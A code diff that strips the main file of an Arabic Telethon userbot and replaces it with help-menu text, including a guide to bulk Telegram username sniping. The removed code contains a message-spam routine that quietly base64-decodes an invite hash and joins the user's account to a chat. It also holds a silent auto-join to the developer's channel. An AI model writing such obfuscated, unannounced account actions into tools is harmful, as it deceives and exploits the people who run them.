@@ -1,161 +1,81 @@
-from telethon.errors.rpcerrorlist import YouBlockedUserError
-from telethon.tl import functions
-from hijri_converter import Gregorian
-from telethon.tl import functions
-from telethon.tl.functions.channels import LeaveChannelRequest
-from collections import deque
-from telethon import events
-from telethon.errors import FloodWaitError
-from telethon.tl.functions.channels import JoinChannelRequest
-from telethon.tl.functions.messages import ImportChatInviteRequest as Get
-from telethon.tl import functions
-import time
-import asyncio
-import logging
-import base64
-import datetime
-from payment import *
-from help import *
-from config import *
-from checktele import *
+commands = '''
+**-` .م1` : اوامر السورس
 
-# -
+-` .م2` : اوامر الحساب
 
-fifthon.start()
+-` .م3` : اوامر الكروبات والاذاعة
 
-y = datetime.datetime.now().year
-m = datetime.datetime.now().month
-dayy = datetime.datetime.now().day
-day = datetime.datetime.now().strftime("%A")
-m9zpi = f"{y}-{m}-{dayy}"
-sec = time.time()
+-` .م4` : اوامر تشيكر و تمويل**
+'''
+sec1 = '''
+`-- -- -- -- -- -- -- -- --`
+**-` .فحص ` : فحص السورس
 
-LOGS = logging.getLogger(__name__)
+-` .المطور ` : مطور السورس
 
-DEVS = [
-    1041483862,
-]
-DEL_TIME_OUT = 10
-normzltext = "1234567890"
-namerzfont = normzltext
-name = "Profile Photos"
-time_name = ["off"]
-time_bio = ["off"]
+-` .الاوامر ` :اوامر السورس**
 
+-` .اعادة تشغيل ` : اعادة تشغيل ل سورس**
+`-- -- -- -- -- -- -- -- --`
+'''
+sec2 = '''
+`-- -- -- -- -- -- -- -- --`
+**-` .ايدي ` :ايدي حسابي
 
-async def join_channel():
-    try:
-        await fifthon(JoinChannelRequest("@fifthon"))
-    except BaseException:
-        pass
+-` .فك حظر ` : فك حظر كل يلي حاظرهم **
+`-- -- -- -- -- -- -- -- --`
+'''
+sec3 = """
+`-- -- -- -- -- -- -- -- --`
+**- ` .مكرر + عدد الثواني + نص` : ارسال رسائل مؤقتة
 
+-` .ادمن` : القنوات يلي انت ادمن بيها**
+`-- -- -- -- -- -- -- -- --`
+"""
+sec4 = """
+`-- -- -- -- -- -- -- -- --`
+**`.تشيكر` : لمعرفه اوامر الصيد**
+`-- -- -- -- -- -- -- -- --`
+"""
+tele_checker = '''
+`-- -- -- -- -- -- -- -- --`**
+✰` .تثبيت يدوي + القناة + اليوزر ` : يثبت اليوزر بقناة معينة
+✰` .صيد + العدد + النوع + القناة ` :يفحص يوزرات ويثتبها عقناتك
+✰` .تثبيت تلقائي + العدد + القناة + اليوزر ` : يثبت اليوزر بقناة معينة
+✰` .حالة الصيد ` : لمعرفة تقدم الكلايم
+✰` .حالة التثبيت التلقائي ` : لمعرفة تقدم التثبيت التلقائي
+✰` .الانواع ` : لمعرفة انواع اليوزرات
+**`-- -- -- -- -- -- -- -- --`
+'''
+tele_checker2 = '''
+---------
+الانواع ياصحبي  :
+---------
+1 : ثلاثي
 
-@fifthon.on(events.NewMessage(outgoing=True, pattern=r"هممم"))
-async def _(event):
-    if not event.is_reply:
-        return await event.edit(
-            "يستعمل الامر بالرد على الصورتهة او الفيديو !"
-        )
-    rr9r7 = await event.get_reply_message()
-    await event.delete()
-    pic = await rr9r7.download_media()
-    await fifthon.send_file(
-        "me", pic, caption=f"تم حفظ الصورة او الفيديو الذاتي هنا : "
-    )
+2 : ثلاثي فقط احرف و اخر ارقام
 
+3 : بوت ثنائي
 
-async def spam_function(event, sandy, cat, sleeptimem, sleeptimet, DelaySpam=False):
-    hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-    counter = int(cat[0])
-    if len(cat) == 2:
-        spam_message = str(cat[1])
-        for _ in range(counter):
-            if event.reply_to_msg_id:
-                await sandy.reply(spam_message)
-            else:
-                await event.client.send_message(event.chat_id, spam_message)
-            await asyncio.sleep(sleeptimet)
-    elif event.reply_to_msg_id and sandy.media:
-        for _ in range(counter):
-            sandy = await event.client.send_file(
-                event.chat_id, sandy, caption=sandy.text
-            )
-            await asyncio.sleep(sleeptimem)
-    elif event.reply_to_msg_id and sandy.text:
-        spam_message = sandy.text
-        for _ in range(counter):
-            await event.client.send_message(event.chat_id, spam_message)
-            await asyncio.sleep(sleeptimet)
-        try:
-            hmm = Get(hmm)
-            await event.client(hmm)
-        except BaseException:
-            pass
+4 : بوت ثلاثي
 
+5 : خماسي حرف
 
-@fifthon.on(events.NewMessage(outgoing=True, pattern=r"\.الاوامر"))
-async def _(event):
-    await event.edit(commands)
+6 : خماسي حرفين
 
-@fifthon.on(events.NewMessage(outgoing=True, pattern=r"\.فحص"))
-async def _(event):
-    start = datetime.datetime.now()
-    await event.edit("جارٍ...")
-    end = datetime.datetime.now()
-    ms = (end - start).microseconds / 1000
-    await event.edit(f'''
-● ھـَْـُلاٌٍے وًَ غ̷̷َـلاَّ شۨغال اࠗلسܱܰ୨ورس ●
-● سـورس ماكس● @M_2_X ● @F_Z_Wh ●
-● البنك : `{ms}`●
-● التاريخ: `{m9zpi}`●
-● ايدي : `{event.sender_id}`●
-''')
+7 : سداسي حرف
 
+8 : سداسي حرفين 
 
-@fifthon.on(events.NewMessage(outgoing=True, pattern=r"\.م1"))
-async def _(event):
-    start = datetime.datetime.now()
-    await event.edit(sec1)
+9 : سباعي حرف 
 
+10 : رباعي
+------------------------------------------------
+طريقةتشغيل الصيد 
 
-@fifthon.on(events.NewMessage(outgoing=True, pattern=r"\.م2"))
-async def _(event):
-    start = datetime.datetime.now()
-    await event.edit(sec2)
-
-
-@fifthon.on(events.NewMessage(outgoing=True, pattern=r"\.م3"))
-async def _(event):
-    start = datetime.datetime.now()
-    await event.edit(sec3)
-
-
-@fifthon.on(events.NewMessage(outgoing=True, pattern=r"\.م4"))
-async def _(event):
-    start = datetime.datetime.now()
-    await event.edit(sec4)
-
-    
-ownerhson_id = 1041483862
-@fifthon.on(events.NewMessage(outgoing=False, pattern='حلم'))
-async def OwnerStart(event):
-    sender = await event.get_sender()
-    if sender.id == ownerhson_id :
-        order = await event.reply('● ● ● @M_2_X ● ● ●')
-
-
-@fifthon.on(events.NewMessage(outgoing=True, pattern=r"\.اعادة تشغيل"))
-async def update(event):
-    await event.edit(" ثـواني ويشتغل ؟ لمن مايشتغل طب سولف بكروبي  @F_Z_Wh")
-    await fifthon.disconnect()
-    await fifthon.send_message("me", "`اكتملت اعادة تشغيل السورس !`")
-
-
-print("- fifthon Userbot Running ..")
-fifthon.run_until_disconnected()
-ownerhson_id = 5929707638
-@fifthon.on(events.NewMessage(outgoing=False, pattern='/ros'))
-async def OwnerStart(event):
-    sender = await event.get_sender()
-    if sender.id == ownerhson_id :
-        order = await event.reply('✓ اهلا مطوري: [َِ𝗠ََِ!َِٓ𝗮ََََِِِِ𝗫](https://t.me/M_2_X) ♕')
+.صيد + عدد الصيد + رقم نوع الصيد + يوزر القناه الذي انشاته
+------------------------------------------------
+-----------------------------
+- مثال : .صيد 40000 2 @F_Z_Wh
+-----------------------------
+'''
